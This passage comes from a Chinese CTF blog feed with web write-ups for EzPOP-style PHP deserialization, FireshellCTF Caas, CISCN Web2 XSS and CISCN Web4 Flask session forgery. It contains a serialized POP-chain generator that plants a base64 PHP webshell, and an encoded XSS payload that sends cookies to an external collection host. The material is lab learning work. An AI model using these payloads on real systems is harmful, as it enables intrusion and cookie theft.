punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 创建失败</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//数据压缩</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php\n//"</span> <span class="token operator">.</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n exit();?>\n"</span> <span class="token operator">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看了眼代码，这不是和之前那个一样吗。正好再做一遍看会了没。</p><p>具体见<a href="https://syunaht.com/p/286731300.html">刷题笔记:[EIS 2019]EzPOP</a></p><p>不过在这里有不一样的地方：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-1/image-20210824140935138.png"></p><p>所以得绕过</p><p>一开始想的是换个后缀</p><p><strong>php后缀</strong>:php3,php4,php5,phtml,pht</p><p>结果都不能被当做php解析，所以另寻他法：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;..&#x2F;shell.php&#x2F;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span>  <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/../shell.php/."</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"YWFhUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ=="</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"base64_decode"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource='</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[FireshellCTF2020]Caas</title>
      <link href="/p/1884635343.html"/>
      <url>/p/1884635343.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FireshellCTF2020-Caas/image-20210822181033264.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>尝试性的输入C代码，返回了个编译文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FireshellCTF2020-Caas/image-20210822212904064.png"></p><p>输入</p><pre class="line-numbers language-none"><code class="language-none">#include &quot;&#x2F;flag&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用报错拿到flag。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-FireshellCTF2020-Caas/image-20210822212949054.png"></p><p>感觉就像在玩脑筋急转弯</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[CISCN2019 华东北赛区]Web2</title>
      <link href="/p/563486977.html"/>
      <url>/p/563486977.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821210439499.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>给了<a href="http://xss.buuoj.cn/">xss平台</a>，明示这题是xss了。</p><p>这种措辞，暗示了是xss。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821221720295.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821220920830.png"></p><p>投票里的英文单引号会变成中文单引号</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821210508698.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821213425074.png"></p><p>先到xss平台拿xss代码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821224003146.png"></p><p>然后使用<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html">HTML Markup</a>进行转码绕过</p><p><code>(new Image()).src</code>改为<code>window.location.href</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">'''(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=gHkxCN&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();'''</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">:</span>    output <span class="token operator">+=</span> <span class="token string">"&amp;#"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;svg>&lt;script>eval&amp;#40&amp;#34"</span> <span class="token operator">+</span> output <span class="token operator">+</span> <span class="token string">"&amp;#34&amp;#41&lt;/script>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#61&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#120&amp;#115&amp;#115&amp;#46&amp;#98&amp;#117&amp;#117&amp;#111&amp;#106&amp;#46&amp;#99&amp;#110&amp;#47&amp;#105&amp;#110&amp;#100&amp;#101&amp;#120&amp;#46&amp;#112&amp;#104&amp;#112&amp;#63&amp;#100&amp;#111&amp;#61&amp;#97&amp;#112&amp;#105&amp;#38&amp;#105&amp;#100&amp;#61&amp;#103&amp;#72&amp;#107&amp;#120&amp;#67&amp;#78&amp;#38&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#116&amp;#111&amp;#112&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#116&amp;#111&amp;#112&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#40&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#32&amp;#38&amp;#38&amp;#32&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#41&amp;#63&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#58&amp;#39&amp;#39&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#59&amp;#125&amp;#41&amp;#40&amp;#41&amp;#59&amp;#34&amp;#41&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成的payload打进去，发现页面自动跳转，说明有效</p><p>页面地址</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;3ab0873a-a1d0-455d-a996-07620bdb753e.node4.buuoj.cn:81&#x2F;post&#x2F;3eb90a2d54bdfadfcfafe59834b8e26a.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要改为</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;web.node4.buuoj.cn:81&#x2F;post&#x2F;3eb90a2d54bdfadfcfafe59834b8e26a.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>放到这里，然后跑一下md5</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821224622133.png"></p><p>之前单线程脚本太慢了，写了个多线程的脚本跑。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210822004536074.png"></p><p>试了很久，xss都没触发，累了，明天再做吧</p><p>第二天又试了下，还是不行，无语了。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[CISCN2019 华东南赛区]Web4</title>
      <link href="/p/358833585.html"/>
      <url>/p/358833585.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[flask|uuid.getnode|网卡|MAC|session]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821171753058.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>感觉像是SSRF</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821171813290.png"></p><p>file提示直接hack</p><p>dict和gopher没提示</p><p>可以读取文件</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821180857549.png"></p><p>读取/proc/self/environ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821195311382.png"></p><p>读/app/app.py</p><p>看来需要构造session</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821200209222.png"></p><p>构造session需要拿到key，而key是由随机生成的，那接下来的问题就是如何拿到随机种子。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821200938155.png"></p><p>而<code>uuid.getnode()</code>获取的是网卡MAC地址的十进制数，需要读取<code>/sys/class/net/eth0/address</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/image-20210821202127531.png"></p><pre class="line-numbers language-none"><code class="language-none">02:42:ac:10:b8:1e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转换成十进制数，6*8=48bit</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> randommac <span class="token operator">=</span> <span class="token string">"02:42:ac:10:b9:08"</span>temp <span class="token operator">=</span> mac<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>mac <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>mac<span class="token punctuation">)</span>randStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">233</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>randStr<span class="token punctuation">)</span><span aria-hidden="true" 